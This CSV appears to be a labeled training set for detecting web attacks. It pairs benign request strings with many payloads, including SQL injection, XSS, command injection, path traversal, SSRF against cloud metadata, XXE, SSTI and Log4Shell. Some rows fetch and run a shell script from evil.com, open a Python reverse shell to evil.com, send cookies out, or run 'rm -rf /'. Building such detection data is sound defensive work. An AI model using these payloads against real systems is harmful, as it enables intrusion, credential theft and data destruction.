text,label,attack_type,severity
X-Forwarded-For: username=sa&password=sa,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=$(id)",1,command_injection,critical
upload image photo_name.jpg,0,normal,none
User-Agent: admin%27/*,1,sql_injection,high
User-Agent: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,1,ssrf,high
download file de.pdf,0,normal,none
GET /products/de HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64--",1,sql_injection,high
"GET /page?id=<scr<script>ipt>alert(1)</scr</script>ipt> HTTP/1.1
Host: target.com",1,xss,medium
upload image photo_fr.jpg,0,normal,none
GET /images/1.png,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/shadow%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E",1,xxe,high
X-Forwarded-For: %24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D,1,log4shell,critical
upload image photo_cameras.jpg,0,normal,none
"GET /search?input=${jndi:ldap://evil.%63om/a} HTTP/1.1
Host: target.com",1,log4shell,critical
load data from 10,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscript%3Ealert(1)%3C/script%3E",1,xss,medium
"GET /page?id=; cat /etc/shadow HTTP/1.1
Host: target.com",1,command_injection,critical
..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
GET /images/smartphones.png,0,normal,none
User-Agent: php://filter/read=convert.base64-encode/resource=index.php,1,path_traversal,medium
X-Forwarded-For: ;%20ls%20-la,1,command_injection,critical
X-Forwarded-For: username=admin&password=123456,1,brute_force,low
load data from 2025,0,normal,none
email=admin@admin.com&password=admin,1,brute_force,low
User-Agent: username=admin&password=,1,brute_force,low
<div style='background:url(javascript:alert(1))'>,1,xss,medium
GET /docs/blue.html,0,normal,none
"GET /page?id=<iframe onload=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: %3Cmeta%20http-equiv=%27refresh%27%20content=%270;url=javascript:alert%281%29%27%3E,1,xss,medium
"GET /page?id=%27%20OR%201=1/* HTTP/1.1
Host: target.com",1,sql_injection,high
create new post title=de,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=id=1%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
"POST /api/orders body={{""item"":""mobile-apps""}}",0,normal,none
Referer: http://target.com/?q=dest=http://localhost/admin,1,ssrf,high
User-Agent: ${jndi:ldap://127.0.0.1:1389/a},1,log4shell,critical
X-Forwarded-For: %3C?xml?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///proc/self/environ%22%3E]%3E,1,xxe,high
username=user123&action=login,0,normal,none
GET /search?q=es&page=1,0,normal,none
Referer: http://target.com/?q=http://metadata.google.internal/computeMetadata/v1/,1,ssrf,high
....\....\....\etc\passwd,1,path_traversal,medium
"GET /page?id=1;%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: target.com",1,sql_injection,high
Referer: http://target.com/?q=;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh,1,command_injection,critical
X-Forwarded-For: %3Cbody%20onload=alert%281%29%3E,1,xss,medium
X-Forwarded-For: 127.0.0.1%20&&%20whoami,1,command_injection,critical
GET /category/jane_smith/items,0,normal,none
"POST /api/feedback body={{""message"":""products""}}",0,normal,none
GET /api/status?service=javascript,0,normal,none
"POST /api/orders body={{""item"":""user123""}}",0,normal,none
"POST /api/feedback body={{""message"":""alice""}}",0,normal,none
"POST /api/orders body={{""item"":""alice""}}",0,normal,none
"GET /page?id=%27%20UNION%20SELECT%20NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
Referer: http://target.com/?q=expression%28alert%281%29%29,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input={{[].__class__.__base__.__subclasses__%28%29}}",1,ssti,high
Referer: http://target.com/?q=..%252f..%252f..%252fetc%252fpasswd,1,path_traversal,medium
"POST /api/orders body={{""item"":""10""}}",0,normal,none
"Referer: http://target.com/?q=<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",1,xxe,high
"GET /page?id=%7Cwhoami HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%20%27x%27=%27x",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=admin%27%20#",1,sql_injection,high
POST /api/cart add item=products,0,normal,none
Referer: http://target.com/?q=username=postgres&password=postgres,1,brute_force,low
GET /search?q=2024&page=1,0,normal,none
; ps aux,1,command_injection,critical
edit comment id=machine-learning,0,normal,none
GET /search?q=march&page=1,0,normal,none
../../../../proc/version,1,path_traversal,medium
download file 2.pdf,0,normal,none
search query for cloud-computing,0,normal,none
GET /products/march HTTP/1.1,0,normal,none
GET /search?q=csv&page=1,0,normal,none
edit comment id=jane_smith,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29--",1,sql_injection,high
"GET /search?input=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: target.com",1,path_traversal,medium
http://169.254.169.254/computeMetadata/v1/,1,ssrf,high
download file user123.pdf,0,normal,none
"GET /search?input=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/evil.dtd""> %xxe;]> HTTP/1.1
Host: target.com",1,xxe,high
....//....//....//etc/passwd,1,path_traversal,medium
User-Agent: {{7*%277%27}},1,ssti,high
User-Agent: %27%20OR%201=1--,1,sql_injection,high
GET /users/fr/profile HTTP/1.1,0,normal,none
username=sa&password=sa,1,brute_force,low
create new post title=25,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=;%20netstat%20-an",1,command_injection,critical
view page number es,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///c:/windows/win.ini%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E",1,xxe,high
%27%20OR%201=1#,1,sql_injection,high
POST /api/cart add item=user123,0,normal,none
sort items by user123 ascending,0,normal,none
X-Forwarded-For: | netstat -an,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=1 OR 1=1/*",1,sql_injection,high
upload image photo_report-january.jpg,0,normal,none
Referer: http://target.com/?q={{%27%27.__class__.__base__.__subclasses__%28%29}},1,ssti,high
upload image photo_cameras.jpg,0,normal,none
"X-Forwarded-For: %27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29--",1,sql_injection,high
edit comment id=de,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://spoofed.burpcollaborator.net",1,ssrf,high
..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
export report price,0,normal,none
edit comment id=invoice-2024,0,normal,none
..\..\..\windows\win.ini,1,path_traversal,medium
http://localhost/admin,1,ssrf,high
{{config.items%28%29}},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=|%20ipconfig",1,command_injection,critical
"POST /api/feedback body={{""message"":""10""}}",0,normal,none
"GET /page?id=%22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=username=info&password=info HTTP/1.1
Host: target.com",1,brute_force,low
http://127.0.0.1:22,1,ssrf,high
X-Forwarded-For: <svg onload=alert(document.domain)>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=User-Agent:%20${jndi:ldap://evil.com/a}",1,log4shell,critical
"GET /page?id={{7*7}} HTTP/1.1
Host: target.com",1,ssti,high
'; EXEC xp_cmdshell('whoami')--,1,sql_injection,high
"User-Agent: 1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64--",1,sql_injection,high
"GET /page?id=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
X-Forwarded-For: gopher://127.0.0.1:9200/_cat/indices,1,ssrf,high
"GET /page?id=1%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20information_schema.tables%29%3E0-- HTTP/1.1
Host: target.com",1,sql_injection,high
filter results by category=electronics,0,normal,none
download file february.pdf,0,normal,none
${jndi:ldap://evil.com/${java:version}},1,log4shell,critical
Referer: http://target.com/?q=username=admin&password=123456,1,brute_force,low
X-Forwarded-For: ../../../../proc/self/environ,1,path_traversal,medium
Referer: http://target.com/?q=..%252f..%252f..%252fetc%252fpasswd,1,path_traversal,medium
GET /images/3.png,0,normal,none
Referer: http://target.com/?q=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
Referer: http://target.com/?q=javascript:alert%28document.cookie%29,1,xss,medium
delete item id=about,0,normal,none
"GET /page?id=%3Caudio%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/feedback body={{""message"":""2""}}",0,normal,none
User-Agent: %3Cobject%20data=javascript:alert%281%29%3E,1,xss,medium
"POST /api/orders body={{""item"":""mobile-apps""}}",0,normal,none
PUT /api/users/price/settings,0,normal,none
User-Agent: %3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"GET /page?id=....//....//....//etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
X-Forwarded-For: </script><script>alert(1)</script>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=username=info&password=info",1,brute_force,low
PUT /api/users/report-january/settings,0,normal,none
"GET /page?id=%27%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=; cat /etc/passwd",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%3Csvg%20onload=alert%281%29%3E",1,xss,medium
GET /images/tablets.png,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=$%28cat%20/etc/passwd%29",1,command_injection,critical
User-Agent: %27%20GROUP%20BY%201--,1,sql_injection,high
PUT /api/users/cloud-computing/settings,0,normal,none
"GET /page?id=<iframe onload=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
GET /category/contact/items,0,normal,none
User-Agent: %2e%2e/%2e%2e/%2e%2e/etc/passwd,1,path_traversal,medium
"GET /page?id=; chmod 777 /etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /search?input=../../../../etc/hosts HTTP/1.1
Host: target.com",1,path_traversal,medium
view page number home,0,normal,none
"GET /search?input=Authorization:%20Basic%20YWRtaW46YWRtaW4= HTTP/1.1
Host: target.com",1,brute_force,low
User-Agent: /var/www/../../etc/passwd,1,path_traversal,medium
GET /api/status?service=about,0,normal,none
"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xxe;</foo>",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%201=1#",1,sql_injection,high
GET /blog/xml HTTP/1.1,0,normal,none
X-Forwarded-For: ' HAVING 1=1--,1,sql_injection,high
Referer: http://target.com/?q=%0a%20cat%20/etc/passwd,1,command_injection,critical
Referer: http://target.com/?q=| crontab -l,1,command_injection,critical
"GET /page?id=<input autofocus onfocus=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=%3Ciframe%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
1; SELECT pg_sleep(5)--,1,sql_injection,high
X-Forwarded-For: 127.0.0.1 | id,1,command_injection,critical
X-Forwarded-For: /etc/passwd%00.php,1,path_traversal,medium
User-Agent: ....\....\....\etc\passwd,1,path_traversal,medium
username=txt&action=login,0,normal,none
create new post title=python,0,normal,none
X-Forwarded-For: %3Cmeta%20http-equiv=%27refresh%27%20content=%270;url=javascript:alert%281%29%27%3E,1,xss,medium
"GET /page?id=javascript:alert%281%29 HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=/etc/passwd%00 HTTP/1.1
Host: target.com",1,path_traversal,medium
"X-Forwarded-For: %27%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
User-Agent: ; wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh,1,command_injection,critical
X-Forwarded-For: {{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}},1,ssti,high
User-Agent: %3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
SELECT%20*%20FROM%20users%20WHERE%20id=1%20OR%201=1,1,sql_injection,high
upload image photo_january.jpg,0,normal,none
User-Agent: <details open ontoggle=alert(1)>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=username=superuser&password=superuser",1,brute_force,low
"GET /page?id=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')> HTTP/1.1
Host: target.com",1,xss,medium
view page number ar,0,normal,none
GET /images/javascript.png,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=$%28id%29",1,command_injection,critical
${jndi:ldap://evil.com/a},1,log4shell,critical
Referer: http://target.com/?q=search=%27%20OR%201=1--&submit=Search,1,sql_injection,high
"GET /page?id=<script>fetch('http://evil.com?c='+btoa(document.cookie))</script> HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=|%20rm%20-rf%20/,1,command_injection,critical
|%20chmod%20+s%20/bin/bash,1,command_injection,critical
GET /search?q=january&page=1,0,normal,none
Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
GET /images/name.png,0,normal,none
User-Agent: /etc/passwd%00.php,1,path_traversal,medium
Referer: http://target.com/?q=1%27%20AND%20SLEEP%285%29--,1,sql_injection,high
GET /search?q=2&page=1,0,normal,none
X-Forwarded-For: $%28env%29,1,command_injection,critical
"GET /search?input=& cat /etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: 1' OR 1=1--,1,sql_injection,high
delete item id=json,0,normal,none
GET /search?q=blue&page=1,0,normal,none
"GET /page?id=<a href='javascript:alert(1)'>click</a> HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=http://172.16.0.1/admin,1,ssrf,high
"GET /search?input=1 UNION SELECT table_name FROM information_schema.tables HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1,xss,medium
POST /api/cart add item=de,0,normal,none
X-Forwarded-For: 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,sql_injection,high
POST /api/cart add item=python,0,normal,none
X-Forwarded-For: dict://127.0.0.1:6379/info,1,ssrf,high
X-Forwarded-For: %3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
GET /images/web-development.png,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cinput%20autofocus%20onfocus=alert%281%29%3E",1,xss,medium
GET /search?q=bob&page=1,0,normal,none
"GET /page?id=| env HTTP/1.1
Host: target.com",1,command_injection,critical
username=products&action=login,0,normal,none
X-Forwarded-For: 1%27%20ORDER%20BY%20100--,1,sql_injection,high
edit comment id=bob,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=<svg onload=alert(1)>",1,xss,medium
"GET /page?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id='; EXEC xp_cmdshell('whoami')-- HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/feedback body={{""message"":""jane_smith""}}",0,normal,none
"POST /api/feedback body={{""message"":""electronics""}}",0,normal,none
sort items by invoice-2024 ascending,0,normal,none
export report about,0,normal,none
X-Forwarded-For: 1%27%20ORDER%20BY%20100--,1,sql_injection,high
"GET /search?input=;%20ps%20aux HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /search?input=..././..././..././etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
Referer: http://target.com/?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,1,xss,medium
"POST /api/orders body={{""item"":""products""}}",0,normal,none
<iframe onload=alert(1)>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=username=root&password=toor",1,brute_force,low
X-Forwarded-For: http://127.0.0.1:9200,1,ssrf,high
%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
User-Agent: ;%20echo%20%27hacked%27%20%3E%20/tmp/pwned,1,command_injection,critical
";%20python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28%29;s.connect%28%28%22evil.com%22,4444%29%29;os.dup2%28s.fileno%28%29,0%29;os.dup2%28s.fileno%28%29,1%29;os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29%27",1,command_injection,critical
load data from alice,0,normal,none
"GET /page?id=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: target.com",1,ssrf,high
GET /search?q=about&page=1,0,normal,none
"GET /search?input=redirect=http://169.254.169.254 HTTP/1.1
Host: target.com",1,ssrf,high
X-Forwarded-For: %3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
export report es,0,normal,none
User-Agent: 1' AND (SELECT * FROM users) > 0--,1,sql_injection,high
"GET /search?input=%27%20UNION%20SELECT%20NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=http://169.254.169.254/computeMetadata/v1/ HTTP/1.1
Host: target.com",1,ssrf,high
User-Agent: username=root&password=root,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=http://127.0.0.1#evil.com",1,ssrf,high
User-Agent: <scr<script>ipt>alert(1)</scr</script>ipt>,1,xss,medium
GET /products/red HTTP/1.1,0,normal,none
..\..\..\..\windows\system32\drivers\etc\hosts,1,path_traversal,medium
search query for xlsx,0,normal,none
User-Agent: %3Cdetails%20open%20ontoggle=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=user=admin&pwd=password",1,brute_force,low
"GET /page?id=%27%22%3E%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/feedback body={{""message"":""txt""}}",0,normal,none
filter results by category=date,0,normal,none
User-Agent: http://10.0.0.1/admin,1,ssrf,high
GET /users/xml/profile HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=<%= 7*7 %>",1,ssti,high
view page number xml,0,normal,none
POST /api/cart add item=2024,0,normal,none
User-Agent: %3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
export report mobile-apps,0,normal,none
User-Agent: http://localhost:8080/manager,1,ssrf,high
Referer: http://target.com/?q=|%20cat%20/etc/passwd,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=javascript:alert%28document.cookie%29",1,xss,medium
edit comment id=name,0,normal,none
sort items by data-science ascending,0,normal,none
GET /products/mobile-apps HTTP/1.1,0,normal,none
User-Agent: <input autofocus onfocus=alert(1)>,1,xss,medium
User-Agent: http://127.0.0.1:3306,1,ssrf,high
